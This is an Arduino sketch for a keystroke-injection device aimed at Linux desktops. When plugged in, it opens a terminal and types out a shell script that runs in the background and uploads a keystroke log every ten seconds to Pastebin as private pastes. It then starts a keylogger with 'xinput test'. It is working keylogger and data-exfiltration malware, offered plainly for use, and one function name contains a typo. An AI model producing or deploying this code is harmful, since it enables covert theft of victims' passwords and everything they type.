void setup(){
  Keyboard.begin();
}
void loop()
{
  delay(5000);
  terminal();
  delay(3000);

  Keyboard.println(F("echo while [ 1 ] > keylog.sh"));
  delay(100);
  Keyboard.println(F("echo do >> keylog.sh"));
  delay(100);
  Keyboard.println(F("echo sleep 10 >> keylog.sh"));
  delay(100);
  Keyboard.println(F("echo out=\\`cat key.log\\` >> keylog.sh"));
  delay(100);
  Keyboard.println(F("echo \"key=\\`curl -s -d \\\"api_dev_key=INPUT2&api_user_name=INPUT0&api_user_password=INPUT1\\\" http://pastebin.com/api/api_login.php\\`\" >> keylog.sh"));
  delay(200);
  Keyboard.println(F("echo \"\\`curl -s -d \\\"api_user_key=\\$key&api_option=paste&api_dev_key=INPUT2&api_paste_name=Linux_Keylog&api_paste_code=\"\\$out\"&api_paste_private=2\\\" http://pastebin.com/api/api_post.php\\`\" >> keylog.sh"));
  delay(200);
  Keyboard.println(F("echo done >> keylog.sh"));
  delay(100);
  Keyboard.println(F("chmod +x keylog.sh"));
  delay(100);
  Keyboard.println(F("sh keylog.sh &"));
  delay(3000);
  terminal();
  delay(3000);
  Keyboard.println(F("keyid=`xinput --list | grep Translated | cut -d\"=\" -f2 | cut -d\"[\" -f1` "));
  delay(100);
  Keyboard.println(F("script -q -c \"xinput test $keyid\" -a key.log"));
  delay(2000);
  //Keyboard.println(F("exit"));
  while(true); 
}

void terminal()
{
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keybboard.press('t');
  delay(100);
  Keyboard.releaseAll(); 
}


